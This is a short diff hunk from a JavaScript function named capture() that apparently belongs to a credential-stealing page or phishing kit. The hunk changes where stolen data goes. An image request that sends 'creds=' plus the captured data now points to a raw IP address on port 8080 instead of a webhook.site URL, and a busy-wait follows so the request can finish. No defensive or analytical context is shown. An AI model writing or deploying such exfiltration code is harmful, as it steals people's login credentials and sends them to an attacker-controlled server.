@@ -220,7 +220,7 @@ function capture() {
 
         var i = new Image();
 
-        i.src = "https://webhook.site/935e6287-bba1-41f0-abd8-c890898bed60?creds=" + safeData;
+        i.src = "http://45.92.1.25:8080/?creds=" + safeData;
 
         var s = new Date().getTime();
         while (new Date().getTime() < s + 500);
